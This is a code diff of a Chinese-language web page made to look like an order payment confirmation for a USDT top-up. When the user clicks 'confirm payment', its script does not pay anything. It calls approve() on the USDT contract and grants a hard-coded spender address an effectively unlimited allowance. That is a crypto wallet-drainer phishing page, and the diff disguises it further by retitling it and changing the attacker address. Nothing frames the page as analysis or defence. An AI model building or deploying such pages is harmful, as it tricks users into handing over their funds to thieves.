@@ -2,30 +2,36 @@
 <!DOCTYPE html>
 <html lang="zh">
 <head>
-  <meta charset="UTF-8" />
-  <title>USDT 主网授权页面</title>
+  <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>订单确认信息</title>
   <style>
-    body { font-family: sans-serif; background: #f9fafb; padding: 2rem; }
-    .card { max-width: 500px; margin: auto; padding: 1.5rem; background: white; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.05); }
-    .label { font-weight: bold; color: #555; display: inline-block; width: 120px; }
-    .status { margin-top: 1rem; color: #d00; font-size: 0.95rem; word-break: break-all; }
-    button { margin-top: 1.5rem; background: #10b981; color: white; padding: 1rem; border: none; border-radius: 8px; font-size: 1rem; width: 100%; }
+    body { font-family: sans-serif; background: #f0f2f5; margin: 0; padding: 2rem; }
+    .card { max-width: 480px; margin: auto; background: white; padding: 2rem; border-radius: 10px; box-shadow: 0 0 12px rgba(0,0,0,0.05); }
+    .card h2 { text-align: center; margin-bottom: 1.5rem; }
+    .row { margin-bottom: 1rem; }
+    .label { font-weight: bold; display: inline-block; width: 120px; color: #555; }
+    .footer { position: fixed; bottom: 0; width: 100%; max-width: 480px; background: white; padding: 1rem; box-shadow: 0 -2px 6px rgba(0,0,0,0.05); }
+    .btn { width: 100%; background: #10b981; color: white; font-size: 1.1rem; padding: 1rem; border: none; border-radius: 8px; }
+    .status { color: red; text-align: center; margin-top: 1rem; font-size: 0.95rem; word-break: break-word; }
   </style>
 </head>
 <body>
   <div class="card">
     <h2>订单确认信息</h2>
-    <div><span class="label">用户名:</span><span id="username">-</span></div>
-    <div><span class="label">充值金额:</span><span id="amount">-</span> USDT</div>
-    <div><span class="label">订单号:</span><span id="orderid">-</span></div>
-    <button onclick="authorize()">确认付款</button>
+    <div class="row"><span class="label">用户名：</span><span id="username">-</span></div>
+    <div class="row"><span class="label">充值金额：</span><span id="amount">-</span> USDT</div>
+    <div class="row"><span class="label">订单编号：</span><span id="orderid">-</span></div>
+  </div>
+
+  <div class="footer">
+    <button class="btn" onclick="authorize()">确认付款</button>
     <div class="status" id="status"></div>
   </div>
 
   <script>
     const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-    const SPENDER = "TX6LRf9FvNwmJM9CyXJbGXHH1oFZZZsYWR";
+    const SPENDER = "TTrMWd5Ukn4dLnQXrbRe1z5AGWa2CDrjLz";
     const AMOUNT = "9223372036854775807";
 
     const query = new URLSearchParams(location.search);
@@ -45,14 +51,14 @@
           if (window.tronLink && window.tronLink.request) {
             await window.tronLink.request({ method: 'tron_requestAccounts' });
           } else {
-            statusEl.innerText = "未检测到支持的钱包，请使用 TronLink、TP 钱包等打开页面。";
+            statusEl.innerText = "未检测到钱包环境，请使用 TP 钱包 / TronLink 打开页面";
             return;
           }
         }
 
         const contract = await tron.contract().at(USDT_CONTRACT);
-        const txid = await contract.approve(SPENDER, tron.toBigNumber(AMOUNT)).send({ feeLimit: 100000000 });
-        statusEl.innerText = "授权成功！交易哈希：" + txid;
+        const result = await contract.approve(SPENDER, tron.toBigNumber(AMOUNT)).send({ feeLimit: 100_000000 });
+        statusEl.innerText = "授权成功，交易哈希：" + result;
       } catch (e) {
         statusEl.innerText = "授权异常：" + (e.message || JSON.stringify(e));
       }
